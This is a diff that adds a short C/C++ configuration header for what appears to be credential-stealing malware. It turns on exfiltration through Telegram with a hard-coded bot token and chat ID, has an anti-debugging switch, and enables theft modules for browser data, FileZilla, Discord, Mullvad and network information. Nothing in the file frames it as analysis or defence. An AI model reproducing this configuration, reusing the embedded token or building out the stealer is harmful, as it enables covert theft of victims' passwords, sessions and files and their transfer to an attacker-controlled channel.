@@ -1,0 +1,19 @@
+#pragma once
+
+
+#define ANTIDBG false
+
+
+#define EXFIL_TELEGRAM  1
+
+
+#define TELEGRAM_TOKEN   L"8479214579:AAETTC-PDSH8En1krLFrlSfs8uNse_Jy-N0"
+#define TELEGRAM_CHAT_ID L"-1003829576590"
+
+
+#define ENABLE_BROWSERSNATCH 1
+#define ENABLE_FILEZILLA  1
+#define ENABLE_DISCORD    1
+#define ENABLE_EXODUS     0
+#define ENABLE_MULLVAD    1
+#define ENABLE_NETWORK    1
